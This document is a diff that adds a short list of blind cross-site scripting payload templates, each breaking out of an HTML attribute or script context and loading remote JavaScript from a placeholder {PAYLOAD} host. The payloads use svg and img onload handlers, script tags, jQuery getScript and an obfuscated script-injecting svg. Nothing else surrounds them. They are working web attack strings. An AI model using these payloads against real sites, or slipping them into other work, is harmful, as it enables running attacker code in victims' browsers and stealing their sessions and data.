@@ -1,0 +1,6 @@
+'"><Svg Src=//{PAYLOAD}/s OnLoad=import(this.getAttribute('src')+0)>
+'"><Img Src=//{PAYLOAD}/x Onload=import(src+0)>
+"><script src="{PAYLOAD}"></script>
+"><script src=//{PAYLOAD}></script>
+<script>$.getScript("//{PAYLOAD}")</script>
+</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/{PAYLOAD}/).slice(2), document.documentElement.appendChild(s))//'>
